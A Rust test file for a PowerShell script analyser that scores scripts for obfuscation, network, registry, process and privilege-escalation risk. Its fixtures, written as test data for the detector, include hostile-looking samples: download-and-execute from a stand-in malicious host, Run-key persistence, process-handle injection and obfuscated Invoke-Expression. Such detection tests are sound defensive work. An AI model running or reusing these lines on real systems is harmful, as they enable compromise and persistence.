#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

use file_scanner::script_analysis::*;
use tempfile::{NamedTempFile, TempDir};

// Helper function to create a basic PowerShell script
fn create_basic_powershell() -> String {
    r#"
# Basic PowerShell script
param(
    [string]$Name = "World"
)

function Get-Greeting {
    param([string]$Name)
    return "Hello, $Name!"
}

Write-Host (Get-Greeting -Name $Name)
Get-Process | Where-Object {$_.Name -eq "notepad"}
"#
    .to_string()
}

// Helper function to create a suspicious PowerShell script
fn create_suspicious_powershell() -> String {
    r#"
# Suspicious PowerShell script
$encoded = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Download and execute
$client = New-Object System.Net.WebClient
$client.DownloadString("http://malicious-site.com/payload.ps1") | Invoke-Expression

# Registry manipulation
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "malware.exe"

# Process injection
$proc = Get-Process "winlogon"
$handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
"#.to_string()
}

// Helper function to create an obfuscated PowerShell script
fn create_obfuscated_powershell() -> String {
    r#"
# Obfuscated PowerShell script
$a='I';$b='n';$c='v';$d='o';$e='k';$f='e';$g='-';$h='E';$i='x';$j='p';$k='r';$l='e';$m='s';$n='s';$o='i';$p='o';$q='n'
$command = $a+$b+$c+$d+$e+$f+$g+$h+$i+$j+$k+$l+$m+$m+$o+$p+$q
& $command ("G"+"e"+"t"+"-"+"P"+"r"+"o"+"c"+"e"+"s"+"s")

# Character array obfuscation
[char[]]$chars = 72,101,108,108,111
$hello = -join $chars

# Base64 obfuscation
$b64 = "R2V0LVByb2Nlc3M="
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))

# String replacement obfuscation
$obf = "Gxx-Prxcxss" -replace 'x','e'
"#.to_string()
}

#[test]
fn test_powershell_file_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Test .ps1 extension
    let ps1_path = temp_dir.path().join("script.ps1");
    std::fs::write(&ps1_path, create_basic_powershell()).unwrap();
    assert!(is_powershell_script(&ps1_path));

    // Test .psm1 extension (module)
    let psm1_path = temp_dir.path().join("module.psm1");
    std::fs::write(&psm1_path, create_basic_powershell()).unwrap();
    assert!(is_powershell_script(&psm1_path));

    // Test .psd1 extension (manifest)
    let psd1_path = temp_dir.path().join("manifest.psd1");
    std::fs::write(&psd1_path, "@{ ModuleVersion = '1.0' }").unwrap();
    assert!(is_powershell_script(&psd1_path));

    // Test content-based detection
    let no_ext_path = temp_dir.path().join("powershell_script");
    std::fs::write(
        &no_ext_path,
        "Get-Process | Where-Object { $_.Name -eq 'test' }",
    )
    .unwrap();
    assert!(is_powershell_script(&no_ext_path));

    // Test non-PowerShell file
    let text_path = temp_dir.path().join("text.txt");
    std::fs::write(&text_path, "This is just plain text content").unwrap();
    assert!(!is_powershell_script(&text_path));
}

#[test]
fn test_basic_powershell_analysis() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    std::fs::write(temp_file.path(), create_basic_powershell()).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();

    // Check basic properties
    assert_eq!(analysis.script_type, ScriptType::PowerShell);
    assert_eq!(analysis.metadata.language, "PowerShell");
    assert!(analysis.metadata.line_count > 5);
    assert!(analysis.metadata.character_count > 100);
    assert!(!analysis.metadata.has_shebang);

    // Check extracted elements
    assert!(!analysis.functions.is_empty());
    assert!(analysis.functions.contains(&"Get-Greeting".to_string()));
    assert!(!analysis.commands.is_empty());
    assert!(analysis
        .commands
        .iter()
        .any(|cmd| cmd.contains("Get-Process")));

    // Should be low risk for basic script
    assert!(matches!(
        analysis.security_analysis.overall_risk,
        RiskLevel::Low | RiskLevel::Medium
    ));
}

#[test]
fn test_suspicious_powershell_analysis() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    std::fs::write(temp_file.path(), create_suspicious_powershell()).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();

    // Check suspicious indicators
    assert!(analysis.suspicious_indicators.has_suspicious_functions);
    assert!(analysis.suspicious_indicators.has_network_access);
    assert!(analysis.suspicious_indicators.has_registry_access);
    assert!(analysis.suspicious_indicators.has_base64_encoding);
    assert!(analysis.suspicious_indicators.risk_score > 30);

    // Should be high risk
    assert!(matches!(
        analysis.security_analysis.overall_risk,
        RiskLevel::High | RiskLevel::Critical
    ));

    // Check security analysis details
    assert!(!analysis.security_analysis.malicious_patterns.is_empty());
    assert!(!analysis.security_analysis.network_activity.is_empty());
    assert!(!analysis.security_analysis.registry_operations.is_empty());
    assert!(!analysis.security_analysis.process_operations.is_empty());
}

#[test]
fn test_obfuscated_powershell_analysis() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    std::fs::write(temp_file.path(), create_obfuscated_powershell()).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();

    // Check obfuscation detection
    assert!(analysis.obfuscation_indicators.is_obfuscated);
    assert!(analysis.obfuscation_indicators.string_concatenation_count > 5);
    assert!(!analysis.obfuscation_indicators.base64_strings.is_empty());
    assert!(!analysis
        .obfuscation_indicators
        .obfuscation_techniques
        .is_empty());
    assert!(analysis.obfuscation_indicators.entropy_score > 3.0);

    // Obfuscated scripts should be higher risk
    assert!(analysis.suspicious_indicators.risk_score > 15);
}

#[test]
fn test_powershell_version_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r"
#Requires -Version 5.1
Get-Process
";
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert_eq!(analysis.metadata.language_version, Some("5.1".to_string()));
}

#[test]
fn test_powershell_with_shebang() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r"#!/usr/bin/env pwsh
Get-Process | Where-Object { $_.Name -eq 'bash' }
";
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.metadata.has_shebang);
    assert_eq!(
        analysis.metadata.interpreter_path,
        Some("/usr/bin/env pwsh".to_string())
    );
}

#[test]
fn test_function_extraction() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r"
function Test-Function1 {
    param($param1)
    return $param1
}

Function Test-Function2($param2) {
    Write-Host $param2
}

function Global:Test-Function3 {
    # Global function
}
";
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert_eq!(analysis.functions.len(), 3);
    assert!(analysis.functions.contains(&"Test-Function1".to_string()));
    assert!(analysis.functions.contains(&"Test-Function2".to_string()));
    assert!(analysis
        .functions
        .contains(&"Global:Test-Function3".to_string()));
}

#[test]
fn test_import_module_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
Import-Module ActiveDirectory
Import-Module -Name "Microsoft.PowerShell.Security"
using module MyCustomModule
using namespace System.Collections.Generic
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(!analysis.imports.is_empty());
    assert!(analysis
        .imports
        .iter()
        .any(|imp| imp.contains("ActiveDirectory")));
    assert!(analysis.imports.iter().any(|imp| imp.contains("Security")));
}

#[test]
fn test_network_activity_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Various network activities
Invoke-WebRequest -Uri "http://example.com"
Invoke-RestMethod -Uri "https://api.example.com/data"
$client = New-Object System.Net.WebClient
$client.DownloadString("http://malicious.com")
$tcp = New-Object System.Net.Sockets.TcpClient
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_network_access);
    assert!(!analysis.security_analysis.network_activity.is_empty());
    assert!(analysis
        .security_analysis
        .network_activity
        .iter()
        .any(|net| net.contains("invoke-webrequest")));
}

#[test]
fn test_file_operations_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# File operations
Get-Content "C:\temp\file.txt"
Set-Content -Path "C:\temp\output.txt" -Value "data"
Copy-Item "source.txt" "destination.txt"
Remove-Item "C:\temp\unwanted.txt"
Out-File -FilePath "log.txt" -InputObject $data
[System.IO.File]::WriteAllText("C:\temp\test.txt", "content")
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_file_manipulation);
    assert!(!analysis.security_analysis.file_operations.is_empty());
}

#[test]
fn test_registry_operations_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Registry operations
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"
Set-ItemProperty -Path "HKCU:\Software\MyApp" -Name "Setting" -Value "Value"
New-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Test"
$reg = [Microsoft.Win32.Registry]::LocalMachine
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_registry_access);
    assert!(!analysis.security_analysis.registry_operations.is_empty());
}

#[test]
fn test_process_operations_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Process operations
Start-Process "notepad.exe"
Get-Process | Where-Object { $_.Name -eq "chrome" }
Stop-Process -Name "malware"
$proc = [System.Diagnostics.Process]::Start("cmd.exe")
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_process_injection);
    assert!(!analysis.security_analysis.process_operations.is_empty());
}

#[test]
fn test_base64_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Base64 encoded content
$encoded = "R2V0LVByb2Nlc3M="
$decoded = [System.Convert]::FromBase64String($encoded)
$longBase64 = "VGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk"
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_base64_encoding);
    assert!(!analysis.obfuscation_indicators.base64_strings.is_empty());
}

#[test]
fn test_encryption_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Encryption operations
$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$encrypted = $aes.CreateEncryptor()
$data = [System.Text.Encoding]::UTF8.GetBytes("secret")
$cipher = $encrypted.TransformFinalBlock($data, 0, $data.Length)
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.suspicious_indicators.has_encryption);
}

#[test]
fn test_privilege_escalation_detection() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Privilege escalation attempts
Start-Process "cmd.exe" -Verb RunAs
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
if ($principal.IsInRole($adminRole)) {
    # UAC bypass attempt
}
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(!analysis.security_analysis.privilege_escalation.is_empty());
}

#[test]
fn test_entropy_calculation() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();

    // High entropy content (random-looking)
    let high_entropy_content = "aKj9x2LmPqR8wN4vZ7cY1fG3bH6sT5uE9qW0iO8pA7sD2fG4hJ6kL3zX1cV8bN5mQ9wE2rT4yU7iO1pA3sD5fG7hJ9kL";
    std::fs::write(temp_file.path(), high_entropy_content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.obfuscation_indicators.entropy_score > 4.0);
}

#[test]
fn test_string_concatenation_obfuscation() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# String concatenation obfuscation
$cmd = "Get" + "-" + "Process"
$path = "C:" + "\" + "Windows" + "\" + "System32"
$evil = "mal" + "ware" + ".exe"
$combined = $cmd + " " + $path + "\" + $evil
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis.obfuscation_indicators.string_concatenation_count > 5);
    assert!(analysis
        .obfuscation_indicators
        .obfuscation_techniques
        .iter()
        .any(|tech| tech.contains("String concatenation")));
}

#[test]
fn test_character_replacement_obfuscation() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Character replacement obfuscation
$obf1 = "Gxx-Prxcxss" -replace 'x','e'
$obf2 = "Stxrt-Prxcxss" -replace 'x','a'
$obf3 = "Invxkx-Wxbxxrxst" -replace 'x','o'
$obf4 = "Sxt-Cxntxnt" -replace 'x','e'
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert!(analysis
        .obfuscation_indicators
        .obfuscation_techniques
        .iter()
        .any(|tech| tech.contains("Character replacement")));
}

#[test]
fn test_risk_level_calculation() {
    let temp_dir = TempDir::new().unwrap();

    // Low risk script
    let low_risk_path = temp_dir.path().join("low_risk.ps1");
    let low_risk_content = r#"
# Simple administrative script
Get-Process | Where-Object { $_.Name -eq "notepad" }
Write-Host "Process check complete"
"#;
    std::fs::write(&low_risk_path, low_risk_content).unwrap();

    let analysis = analyze_powershell(&low_risk_path).unwrap();
    assert!(matches!(
        analysis.security_analysis.overall_risk,
        RiskLevel::Low
    ));

    // High risk script
    let high_risk_path = temp_dir.path().join("high_risk.ps1");
    std::fs::write(&high_risk_path, create_suspicious_powershell()).unwrap();

    let analysis = analyze_powershell(&high_risk_path).unwrap();
    assert!(matches!(
        analysis.security_analysis.overall_risk,
        RiskLevel::High | RiskLevel::Critical
    ));
}

#[test]
fn test_powershell_serialization() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    std::fs::write(temp_file.path(), create_basic_powershell()).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();

    // Test JSON serialization
    let json = serde_json::to_string(&analysis).unwrap();
    let deserialized: ScriptAnalysis = serde_json::from_str(&json).unwrap();

    assert_eq!(deserialized.script_type, ScriptType::PowerShell);
    assert_eq!(deserialized.metadata.language, analysis.metadata.language);
    assert_eq!(deserialized.functions.len(), analysis.functions.len());
}

#[test]
fn test_empty_powershell_file() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    std::fs::write(temp_file.path(), "").unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();
    assert_eq!(analysis.metadata.line_count, 0); // Empty file has 0 lines
    assert_eq!(analysis.metadata.character_count, 0);
    assert!(analysis.functions.is_empty());
    assert!(analysis.commands.is_empty());
}

#[test]
fn test_malformed_powershell() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r"
# Malformed PowerShell with syntax errors
function BrokenFunction {
    param($param1
    # Missing closing parenthesis
    Get-Process |
    # Incomplete pipeline
}
# Unclosed function
";
    std::fs::write(temp_file.path(), content).unwrap();

    // Should still analyze without crashing
    let result = analyze_powershell(temp_file.path());
    assert!(result.is_ok());

    let analysis = result.unwrap();
    assert_eq!(analysis.script_type, ScriptType::PowerShell);
}

// Integration test with multiple suspicious indicators
#[test]
fn test_comprehensive_suspicious_script() {
    let temp_file = NamedTempFile::with_suffix(".ps1").unwrap();
    let content = r#"
# Comprehensive suspicious PowerShell script
$b64 = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
$cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))

# Obfuscated command construction
$c1='I';$c2='n';$c3='v';$c4='o';$c5='k';$c6='e';$c7='-';$c8='E';$c9='x'
$iecommand = $c1+$c2+$c3+$c4+$c5+$c6+$c7+$c8+$c9+'pression'

# Network activity
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://malicious.com/payload")

# Registry persistence
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "backdoor.exe"

# Process injection
$proc = Get-Process "explorer"
$handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)

# File operations
$malware = "C:\Windows\System32\evil.exe"
Copy-Item "payload.exe" $malware -Force

# Character array obfuscation
$chars = [char[]]@(72,101,108,108,111,32,87,111,114,108,100)
$hello = -join $chars

# Multiple replace operations
$obf = "Gxx-Prxcxss" -replace 'x','e'
$obf2 = "Stxrt-Prxcxss" -replace 'x','a'
$obf3 = "Invxkx-Cxmmxnd" -replace 'x','o'

# Privilege escalation
Start-Process "cmd.exe" -Verb RunAs -WindowStyle Hidden
"#;
    std::fs::write(temp_file.path(), content).unwrap();

    let analysis = analyze_powershell(temp_file.path()).unwrap();

    // Should detect multiple suspicious indicators
    assert!(analysis.suspicious_indicators.has_suspicious_functions);
    assert!(analysis.suspicious_indicators.has_network_access);
    assert!(analysis.suspicious_indicators.has_file_manipulation);
    assert!(analysis.suspicious_indicators.has_registry_access);
    assert!(analysis.suspicious_indicators.has_process_injection);
    assert!(analysis.suspicious_indicators.has_base64_encoding);

    // Should detect obfuscation
    assert!(analysis.obfuscation_indicators.is_obfuscated);
    assert!(analysis.obfuscation_indicators.string_concatenation_count > 5);
    assert!(!analysis.obfuscation_indicators.base64_strings.is_empty());

    // Should be high/critical risk
    assert!(matches!(
        analysis.security_analysis.overall_risk,
        RiskLevel::High | RiskLevel::Critical
    ));
    assert!(analysis.suspicious_indicators.risk_score > 60);

    // Should detect multiple security analysis categories
    assert!(!analysis.security_analysis.malicious_patterns.is_empty());
    assert!(!analysis.security_analysis.network_activity.is_empty());
    assert!(!analysis.security_analysis.file_operations.is_empty());
    assert!(!analysis.security_analysis.registry_operations.is_empty());
    assert!(!analysis.security_analysis.process_operations.is_empty());
    assert!(!analysis.security_analysis.privilege_escalation.is_empty());
}
